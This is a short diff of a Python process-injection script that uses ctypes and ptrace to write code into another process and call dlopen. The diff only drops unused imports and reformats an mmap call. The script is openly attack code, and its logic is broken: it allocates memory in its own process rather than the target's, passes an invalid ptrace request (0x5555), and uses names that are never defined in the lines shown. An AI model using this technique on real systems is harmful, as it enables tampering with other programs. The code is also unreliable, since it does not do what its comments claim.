@@ -1,7 +1,4 @@
-import os
-import sys
 import ctypes
-import struct
 
 # Define the code to be injected
 code_to_inject = """
@@ -25,7 +22,9 @@ MAP_ANONYMOUS = 0x20
 dlopen = ctypes.CDLL(None).dlopen
 
 # Allocate some memory in the target process's address space
-addr = libc.mmap(None, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
+addr = libc.mmap(
+    None, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
+)
 
 # Write the code to the allocated memory
 libc.ptrace(4, pid, addr, code_to_inject.encode())
@@ -36,5 +35,3 @@ libc.ptrace(0x5555, pid, dlopen_addr, addr)
 
 # Detach from the target process
 libc.ptrace(17, pid, None, None)
-
-
